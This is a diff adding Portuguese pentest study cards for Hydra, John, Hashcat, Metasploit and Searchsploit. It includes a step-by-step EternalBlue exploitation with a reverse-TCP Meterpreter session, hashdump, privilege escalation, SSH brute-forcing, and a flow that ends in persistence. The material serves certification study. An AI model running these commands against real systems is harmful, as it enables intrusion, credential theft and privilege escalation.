@@ -154,6 +154,24 @@ IMPORTANTE: Só crackee hashes que você tem autorização!
 
 Força bruta de login em praticamente qualquer serviço (SSH, FTP, HTTP, SMB, RDP, etc).
 
+### 🎯 Quando usar o Hydra
+- Quando encontrou um serviço aberto (SSH, FTP, RDP) mas não tem a senha
+- Quando quer testar credenciais padrão em múltiplos hosts
+- Quando precisa testar login forms HTTP/HTTPS com brute force
+- Quando um ataque anterior de enumeração revelou nomes de usuários válidos
+
+### 🛠️ Como o Hydra te ajuda
+- Testa milhares de combinações de usuário/senha automaticamente em minutos
+- Suporta 50+ protocolos (SSH, FTP, HTTP, SMB, RDP, MySQL, etc)
+- Permite ajustar threads para ser mais rápido ou mais silencioso
+- Para no primeiro sucesso quando encontra credenciais válidas
+
+### ➡️ Depois de usar o Hydra — Próximos passos
+1. Use as credenciais encontradas para logar no serviço (SSH, FTP, etc)
+2. Enumere o sistema acessado para encontrar vetores de privesc
+3. Verifique se as mesmas credenciais funcionam em outros serviços
+4. Documente o vetor de ataque para o relatório de pentest
+
 ### Instalação
 ```bash
 sudo apt install -y hydra
@@ -246,6 +264,24 @@ hydra -l admin -P passwords.txt target.com http-post-form \
 
 Cracking de hashes. Suporta centenas de formatos de hash.
 
+### 🎯 Quando usar o John the Ripper
+- Quando coletou hashes de um sistema (ex: /etc/shadow, banco de dados) e precisa quebrá-los
+- Quando não tem GPU e precisa crackear hashes via CPU
+- Quando encontrou um formato de hash exótico que outros tools não reconhecem
+- Quando quer aplicar regras de mutação para aprimorar uma wordlist
+
+### 🛠️ Como o John the Ripper te ajuda
+- Suporta centenas de formatos de hash (MD5, SHA, bcrypt, NTLM, descrypt, etc)
+- Detecta automaticamente o formato do hash sem precisar especificar
+- Oferece múltiplos modos: wordlist, incremental, single e rules
+- Salva progresso automaticamente — pode interromper e continuar depois
+
+### ➡️ Depois de usar o John the Ripper — Próximos passos
+1. Verifique os hashes crackeados com `john --show hash.txt`
+2. Use as senhas obtidas para autenticar em serviços encontrados
+3. Se o John não crackear, tente Hashcat (se tiver GPU disponível)
+4. Teste as senhas em outros sistemas do mesmo domínio
+
 ### Instalação
 ```bash
 sudo apt install -y john
@@ -325,6 +361,24 @@ john --wordlist=/usr/share/seclists/Passwords/Top1000.txt hashes.txt
 ## Hashcat
 
 Cracking de hashes com GPU. Muito mais rápido que John para hashes simples.
+
+### 🎯 Quando usar o Hashcat
+- Quando tem uma GPU disponível e precisa crackear grandes volumes de hashes
+- Quando o John the Ripper foi lento demais ou não conseguiu crackear
+- Quando precisa aplicar máscaras (brute force puro) com alta performance
+- Quando o alvo tem hashes NTLM, MD5 ou SHA em escala (ex:.Active Directory)
+
+### 🛠️ Como o Hashcat te ajuda
+- Processa hashes 100x mais rápido que ferramentas baseadas em CPU
+- Suporta 300+ modos de hash (MD5, SHA, NTLM, WPA, Kerberos, etc)
+- Permite máscaras inteligentes (?l para letra, ?d para dígito, ?u para maiúscula)
+- Aceita regras de mutação que expandem uma wordlist pequena em milhões de variações
+
+### ➡️ Depois de usar o Hashcat — Próximos passos
+1. Consulte os resultados com `hashcat --show cracked.txt`
+2. Use as senhas para logar nos serviços descobertos no reconhecimento
+3. Se o ataque falhar, combine wordlist + regras (-r best64.rule) ou máscaras
+4. Registre o tempo gasto e a taxa de hashes/segundo para métricas do pentest
 
 ### Instalação
 ```bash
@@ -490,3 +544,309 @@ hashid -f 'hash_to_crack.txt'
 
 ### Dica de Estudo
 > Comece sempre com wordlists pequenas (Top1000) antes de usar listas grandes. Identifique o formato do hash antes de crackear. Documente cada tentativa e os resultados encontrados. Use Hydra com `-t 4` para evitar bloqueios.
+
+---
+
+## Tool Card: Metasploit Framework
+
+**O que é:** Framework de exploração mais usado do mundo — 2,300+ exploits, payloads, auxiliares e post-exploração. Essencial para OSCP/CEH.
+
+### 🎯 Quando usar o Metasploit Framework
+- Quando encontrou uma vulnerabilidade (via Nmap, Nuclei ou Searchsploit) e precisa explorá-la
+- Quando quer gerar payloads customizados (reverse shell, bind shell, meterpreter)
+- Quando precisa de uma sessão interativa no alvo para post-exploração
+- Quando quer automatizar scans de vulnerabilidade com módulos auxiliares
+
+### 🛠️ Como o Metasploit te ajuda
+- Reúne 2,300+ exploits, payloads e auxiliares em um único console interativo
+- Fornece sessões Meterpreter para pós-exploração (hashdump, keylogger, screenshot)
+- Permite escalar privilégios com exploits locais (MS16-032, MS17-010, etc)
+- Integra com Nmap, Searchsploit e outras ferramentas via(resource scripts)
+
+### ➡️ Depois de usar o Metasploit Framework — Próximos passos
+1. Interaja com a sessão Meterpreter para coletar informações (`sysinfo`, `getuid`)
+2. Execute `hashdump` para extrair hashes e quebrar com John/Hashcat
+3. Tente escalar privilégios com exploits locais (background → use local exploit)
+4. Documente cada passo: vulnerabilidade → exploitation → privesc → impacto
+
+### Instalação
+
+```bash
+# Pré-instalado no Kali. Verificar:
+msfconsole --version
+# Framework version: 6.3.44-dev
+```
+
+### Fluxo básico do Metasploit
+
+```
+1. msfconsole         → Abrir console
+2. search             → Buscar exploit
+3. use exploit/...    → Selecionar exploit
+4. show options       → Ver parâmetros necessários
+5. set RHOSTS 10.0.0.1 → Definir alvo
+6. set PAYLOAD ...    → Definir payload
+7. exploit            → Executar
+```
+
+### Comandos essenciais
+
+| Comando | O que faz |
+|:--------|:----------|
+| `msfconsole` | Abrir console interativo |
+| `search <termo>` | Buscar exploits/auxiliares |
+| `use <exploit>` | Selecionar módulo |
+| `show options` | Ver parâmetros do módulo |
+| `set <opção> <valor>` | Definir parâmetro |
+| `show payloads` | Listar payloads disponíveis |
+| `set PAYLOAD <payload>` | Definir payload |
+| `exploit` | Executar ataque |
+| `run` | Sinônimo de exploit |
+| `back` | Sair do módulo atual |
+| `sessions` | Listar sessões abertas |
+| `sessions -i 1` | Interagir com sessão 1 |
+| `sessions -k 1` | Matar sessão 1 |
+| `info` | Ver detalhes do módulo |
+| `show advanced` | Ver opções avançadas |
+
+### Exemplo completo: scan → exploit → session
+
+```bash
+# 1. Iniciar msfconsole
+msfconsole
+
+# OUTPUT ESPERADO:
+#        =[ metasploit v6.3.44-dev ]
+# + -- --=[ 2390 exploits - 1230 auxiliary ]
+# + -- --=[ 413 payloads - 46 encoders - 11 nops ]
+# + -- --=[ 9 evasion plugins ]
+#
+# msf6 >
+
+# 2. Buscar exploit para MS17-010 (EternalBlue)
+msf6 > search ms17-010
+
+# OUTPUT ESPERADO:
+# Matching Modules
+# ================
+#   #  Name                   Disclosure Date  Rank     Check  Description
+#   -  ----                   ---------------  ----     -----  -----------
+#   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14  average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+
+# 3. Selecionar exploit
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+
+# OUTPUT ESPERADO:
+# [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+
+# 4. Ver parâmetros
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+# OUTPUT ESPERADO:
+# Module options:
+#    RHOSTS    The target host(s)
+#    RPORT     The target port (SMB)    yes  445
+#    SMBDomain  Workgroup               no
+#    SMBUser    SMB Username             no
+#    SMBPass    SMB Password             no
+#
+# Payload options:
+#    EXITFUNC  Thread exit function     yes  thread
+#    LHOST     The listen address       yes  10.0.0.100
+#    LPORT     The listen port          yes  4444
+
+# 5. Definir parâmetros
+msf6 > set RHOSTS 10.0.0.1
+RHOSTS => 10.0.0.1
+msf6 > set LHOST 10.0.0.100
+LHOST => 10.0.0.100
+
+# 6. Executar
+msf6 > exploit
+
+# OUTPUT ESPERADO:
+# [*] Started reverse TCP handler on 10.0.0.100:4444
+# [*] 10.0.0.1:445 - Target OS: Windows 7 Professional 7601 Service Pack 1
+# [*] 10.0.0.1:445 - Using named pipe: f4cc0b8c001beef1
+# [*] 10.0.0.1:445 - Target CUL: 0x9001f - Likely exploitable!
+# [*] 10.0.0.1:445 - Metasploit relaying to named pipe...
+# [*] Sending stage (200774 bytes) to 10.0.0.1
+# [*] Meterpreter session 1 opened (10.0.0.100:4444 -> 10.0.0.1:49152)
+
+# 7. Interagir com a sessão
+meterpreter > sysinfo
+# Computer        : DESKTOP-ABC123
+# OS              : Windows 7 (6.1.7601 Service Pack 1)
+# Architecture    : x64
+# System Language : pt-BR
+# Meterpreter     : x64/windows
+
+meterpreter > getuid
+# Server username: NT AUTHORITY\SYSTEM
+
+meterpreter > hashdump
+# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+
+### Escalar privilégios com Metasploit
+
+```bash
+# Dentro da sessão Meterpreter:
+meterpreter > getuid
+# Server username: DOMINIO\usuario
+
+# Usar exploit de privesc (ex: ms16-032)
+meterpreter > background  # voltar ao console
+msf6 > use exploit/windows/local/ms16_032_secondary_logon
+msf6 > set SESSION 1
+msf6 > set LHOST 10.0.0.100
+msf6 > exploit
+
+# Nova sessão com SYSTEM:
+meterpreter > getuid
+# Server username: NT AUTHORITY\SYSTEM
+```
+
+### Módulos auxiliares úteis
+
+```bash
+# Scan de vulns
+msf6 > use auxiliary/scanner/smb/smb_ms17_010
+msf6 > set RHOSTS 10.0.0.0/24
+msf6 > run
+
+# OUTPUT ESPERADO:
+# [+] 10.0.0.1:445      - Host is likely VULNERABLE to MS17-010!
+# [-] 10.0.0.2:445      - Host does not appear vulnerable
+
+# Enumeração de usuários SMB
+msf6 > use auxiliary/scanner/smb/smb_enumusers
+msf6 > set RHOSTS 10.0.0.1
+msf6 > run
+
+# Brute force SSH
+msf6 > use auxiliary/scanner/ssh/ssh_login
+msf6 > set RHOSTS 10.0.0.1
+msf6 > set USERNAME admin
+msf6 > set PASS_FILE /usr/share/seclists/Passwords/Top1000.txt
+msf6 > run
+```
+
+---
+
+## Tool Card: Searchsploit
+
+**O que é:** Interface CLI para Exploit-DB — busca offline de exploits por nome, CVE, plataforma.
+
+### 🎯 Quando usar o Searchsploit
+- Quando identificou uma versão de software específica e quer saber se existe exploit público
+- Quando tem um CVE e precisa encontrar código de exploração funcional
+- Quando quer cruzar o output do Nmap com exploits conhecidos
+- Quando precisa de uma referência rápida sem abrir o navegador
+
+### 🛠️ Como o Searchsploit te ajuda
+- Busca offline no banco de dados do Exploit-DB — funciona sem internet
+- Permite visualizar o código do exploit antes de baixar (`-x ID`)
+- Aceita input do Nmap em XML para sugerir exploits automaticamente
+- Copia exploits para o diretório local com um único comando (`-m ID`)
+
+### ➡️ Depois de usar o Searchsploit — Próximos passos
+1. Copie o exploit com `searchsploit -m ID` e analise o código
+2. Verifique se o exploit é para Metasploit (usa direto no msfconsole) ou standalone
+3. Teste em ambiente controlado antes de usar no alvo real
+4. Adapte o exploit se necessário (mude IP, porta ou payload)
+
+### Instalação
+
+```bash
+# Pré-instalado no Kali (faz parte do exploitdb)
+searchsploit --version
+# Exploit-Database - https://www.exploit-db.com/
+```
+
+### Comandos essenciais
+
+| Comando | O que faz |
+|:--------|:----------|
+| `searchsploit <termo>` | Buscar exploits |
+| `searchsploit -c <termo>` | Busca case-insensitive |
+| `searchsploit -x <ID>` | Ver código do exploit |
+| `searchsploit -m <ID>` | Copiar exploit para diretório atual |
+| `searchsploit --nmap <arquivo>` | Buscar exploits baseado em output do Nmap |
+| `searchsploit --cve <CVE>` | Buscar por CVE |
+| `searchsploit -p` | Ver path completo do exploit |
+
+### Exemplos práticos
+
+```bash
+# Buscar exploit para Windows 7
+searchsploit windows 7 smb
+
+# OUTPUT ESPERADO:
+# Exploits: 3
+# ──────────────────────────────────────────────
+#  Exploit Title                                                   | Path
+# ──────────────────────────────────────────────
+#  Microsoft Windows 7/8/10 SMB Remote Code Execution (MS17-010)  | windows/remote/42315.py
+#  Microsoft Windows 7 - SMB Remote Code Execution (MS17-010)      | windows/remote/41891.rb
+# ──────────────────────────────────────────────
+
+# Buscar por CVE
+searchsploit --cve 2017-0144
+
+# Ver código do exploit
+searchsploit -x 42315
+
+# Copiar exploit para diretório atual
+searchsploit -m 42315
+
+# OUTPUT ESPERADO:
+#   Exploit: Microsoft Windows 7/8/10 SMB Remote Code Execution (MS17-010)
+#   Path: /usr/exploits/windows/remote/42315.py
+#   Copied to: ./42315.py
+
+# Buscar com output do Nmap (salvar nmap em XML)
+nmap -sV -oX scan.xml 10.0.0.1
+searchsploit --nmap scan.xml
+
+# Buscar apenas exploits (excluir auxiliares)
+searchsploit --exclude="auxiliary" windows smb
+```
+
+### Integrar Searchsploit + Metasploit
+
+```bash
+# Encontrar exploit no searchsploit
+searchsploit ms17-010
+
+# Copiar e ver o código
+searchsploit -m 42315
+cat 42315.py
+
+# Se for um exploit do Metasploit, usar direto no msfconsole:
+msf6 > search ms17-010
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+```
+
+---
+
+## Fluxo de Explotation completo
+
+```
+1. Reconhecimento (Nmap)
+        ↓
+2. Identificar vulnerabilidade (searchsploit / nuclei)
+        ↓
+3. Escolher exploit (Metasploit ou manual)
+        ↓
+4. Configurar payload e parâmetros
+        ↓
+5. Executar exploit
+        ↓
+6. Ganhar acesso (Meterpreter / shell)
+        ↓
+7. Escalar privilégios (privesc)
+        ↓
+8. Manter acesso (persistence)
+```
